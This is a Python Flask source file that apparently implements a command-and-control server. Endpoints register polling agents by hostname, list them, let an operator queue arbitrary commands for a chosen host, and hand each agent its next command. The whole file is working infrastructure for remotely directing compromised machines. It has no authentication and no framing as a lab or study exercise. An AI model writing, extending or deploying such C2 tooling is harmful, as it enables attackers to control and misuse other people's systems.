from flask import Flask, request, jsonify
import os
from c2_server.dispatcher import AgentStore

app = Flask(__name__)
store = AgentStore()

@app.route("/agent/heartbeat", methods=["POST"])
def heartbeat():
    data = request.get_json()
    registered = store.register_or_update(data)
    if registered:
        print(f"📡 Registered/Updated agent: {data.get('hostname')}")
        return jsonify({"message": "ACK from C2"}), 200
    else:
        return jsonify({"error": "Missing hostname or IP"}), 400

@app.route("/agents", methods=["GET"])
def list_agents():
    agents = store.get_all_agents()
    return jsonify(agents), 200

@app.route("/command/queue", methods=["POST"])
def queue_command():
    data = request.get_json()
    hostname = data.get("hostname")
    command = data.get("command")

    if not hostname or not command:
        return jsonify({"error": "hostname and command required"}), 400

    store.queue_command(hostname, command)
    print(f"✅ Queued command for {hostname}: {command}")
    return jsonify({"message": "Command queued"}), 200

@app.route("/agent/next", methods=["POST"])
def next_command():
    data = request.get_json()
    hostname = data.get("hostname")

    if not hostname:
        return jsonify({"error": "hostname required"}), 400

    command = store.get_next_command(hostname)
    if command:
        print(f"➡️  Dispatching command to {hostname}: {command}")
        return jsonify({"command": command}), 200
    else:
        return jsonify({"command": None}), 200
